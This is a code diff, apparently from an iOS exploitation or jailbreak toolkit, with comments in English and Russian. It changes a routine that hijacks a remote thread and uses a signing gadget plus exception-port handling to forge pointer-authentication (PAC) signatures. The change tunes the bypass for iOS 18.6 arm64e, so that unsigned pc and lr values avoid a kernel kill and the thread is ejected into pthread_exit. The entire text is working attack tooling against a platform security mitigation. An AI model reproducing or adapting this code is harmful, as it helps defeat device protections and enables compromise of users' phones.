@@ -136,8 +136,13 @@ uint64_t kp_remotepac(uint64_t remotethreadaddr, uint64_t address, uint64_t modi
     kp_arm_thread_state64_internal state;
     memset(&state, 0, sizeof(state));
     state.__sp = sp;
-    state.__pc = kp_pacia(g_rc_paciagadget, kp_ptrauthstrdisc("pc"));
-    state.__lr = kp_pacia(KP_FAKE_LR, kp_ptrauthstrdisc("lr"));
+    // iOS 18.6 arm64e: fetching a PAC-signed pc is FATAL (kernel SIGKILLs the
+    // task, no exception delivery). Raw canonical pc — the kernel signs the
+    // resume ELR itself; pacia then runs under the swapped (remote) keys.
+    state.__pc = g_rc_paciagadget;
+    // Raw unmapped lr: plain `ret` lands on 0x401 → ordinary EXC_BAD_ACCESS
+    // (not PAC-flavored) → catchable by our exception port.
+    state.__lr = KP_FAKE_LR;
     state.__x[0]  = 0;
     state.__x[1]  = address;
     state.__x[2]  = modifier;
@@ -198,14 +203,14 @@ uint64_t kp_remotepac(uint64_t remotethreadaddr, uint64_t address, uint64_t modi
 
     uint64_t signedAddress = exc.threadState.__x[16];
 
-    // eject-ответ: гасим exception, отправляя поток в pthread_exit (pc подписан
-    // текущими ключами pacthread = после swap это main keys, pacia валидна).
+    // eject-ответ: гасим exception, отправляя поток в pthread_exit. Сырой
+    // canonical pc — ядро само подпишет ELR при возврате из exception.
     void *pe = dlsym(RTLD_DEFAULT, "pthread_exit");
     if (pe) {
         kp_arm_thread_state64_internal st2 = exc.threadState;
         st2.__x[0] = 0;
-        st2.__pc = kp_pacia(kp_pac_nativestrip((uint64_t)pe), kp_ptrauthstrdisc("pc"));
-        st2.__lr = kp_pacia(KP_FAKE_LR, kp_ptrauthstrdisc("lr"));
+        st2.__pc = kp_pac_nativestrip((uint64_t)pe);
+        st2.__lr = KP_FAKE_LR;
         bool rok = kp_statereply(&exc, &st2);
         paclog(@"    [rp] reply(eject→pthread_exit): %@", rok ? @"OK" : @"FAIL");
         usleep(3000);
